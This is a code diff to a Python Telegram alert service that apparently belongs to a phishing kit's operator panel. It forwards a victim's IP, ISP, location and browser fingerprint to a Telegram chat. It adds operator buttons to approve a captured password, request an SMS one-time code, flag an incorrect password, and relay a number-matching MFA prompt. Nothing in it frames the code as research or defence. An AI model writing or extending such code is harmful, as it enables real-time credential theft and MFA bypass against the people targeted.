@@ -62,6 +62,19 @@ class TelegramService:
         return self.send_message(message, "HTML")
 
     def send_login_alert(self, state):
+        """
+        quickly send a login alert to the configured Telegram chat with details from the state dictionary.
+
+        📱 <b>Device & Browser Fingerprint:</b>
+    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
+    • OS: <code>{visitor.get('os', 'Unknown')}</code>
+    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
+    • Language: <code>{visitor.get('language', 'Unknown')}</code>
+    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
+    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
+    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>
+
+        """
         if not self.is_configured():
             return None
 
@@ -97,15 +110,7 @@ class TelegramService:
     • Country: <code>{visitor.get('country_name', 'Unknown')} ({visitor.get('country_code', '??')})</code>
     • Provider/ISP: <code>{visitor.get('org', 'Unknown')}</code>
 
-    📱 <b>Device & Browser Fingerprint:</b>
-    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
-    • OS: <code>{visitor.get('os', 'Unknown')}</code>
-    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
-    • Language: <code>{visitor.get('language', 'Unknown')}</code>
-    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
-    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
-    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>
-
+    
     ━━━━━━━━━━━━━━━━━━
     📌 <b>Timestamp:</b> {time_format}
     ━━━━━━━━━━━━━━━━━━
@@ -156,15 +161,32 @@ class TelegramService:
 What is the guest status for this OTP?
         """.strip()
 
-        inline_keyboard = {
-            "inline_keyboard": [
-                [
-                    {"text": "Approve OTP ✅", "callback_data": f"tg:approve:{attempt_id}"},
-                    {"text": "Invalid Code Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
-                ]
-            ]
-        }
+        keyboard = []
+        keyboard.append([
+            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
+        ])
+        keyboard.append([
+            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
+            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
+        ])
+
+        candidates = state.get("promptCandidates") or []
+        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
+            row = []
+            for num in candidates:
+                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
+            keyboard.append(row)
+            keyboard.append([
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
+            ])
+        else:
+            keyboard.append([
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
+            ])
+
+        inline_keyboard = {"inline_keyboard": keyboard}
         return self.send_message(message, "HTML", inline_keyboard)
+        
 
     def poll_updates(self, on_action_received):
         if not self.is_configured():
@@ -279,7 +301,7 @@ What is the guest status for this OTP?
                                     self.api_call("editMessageText", {
                                         "chat_id": chat_id_val,
                                         "message_id": orig.get("message_id") if orig else None,
-                                        "text": orig_text + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
+                                        "text": orig_text,
                                         "parse_mode": "HTML",
                                         "reply_markup": {"inline_keyboard": keyboard}
                                     })
@@ -333,7 +355,7 @@ What is the guest status for this OTP?
                                 self.api_call("editMessageText", {
                                     "chat_id": chat_id_val,
                                     "message_id": orig.get("message_id") if orig else None,
-                                    "text": orig_text + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
+                                    "text": orig_text,
                                     "parse_mode": "HTML",
                                     "reply_markup": {"inline_keyboard": keyboard}
                                 })
